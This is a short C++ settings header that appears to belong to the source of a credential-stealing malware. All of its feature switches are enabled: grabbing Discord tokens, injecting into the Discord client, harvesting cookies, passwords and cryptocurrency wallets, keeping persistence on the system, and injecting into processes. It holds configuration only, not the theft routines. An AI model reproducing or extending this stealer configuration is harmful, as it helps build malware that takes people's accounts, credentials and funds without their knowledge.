#pragma once
#ifndef SETTINGS_HPP
#define SETTINGS_HPP

/*
    Settings header
    @file Settings.hpp
    @author miaouCorp
    @version 1.0
*/

namespace Settings
{
    const std::string KEY{""};

    namespace Discord
    {
        bool const DISCORD_BACKUPS{ TRUE };
        bool const INJECTION_DISCORD{ TRUE };
        bool const TOKEN_GRAB{ TRUE };
    } // Discord end

    namespace Account
    {
        bool const COOKIES{ TRUE };
        bool const PASSWORDS{ TRUE };
        bool const WALLETS{ TRUE };
    } // Account end

    namespace System
    {
        bool const PERSISTENCE{ TRUE };
        bool const INJECT_PROCESS{ TRUE };
    } // System end
} // Settings end

#endif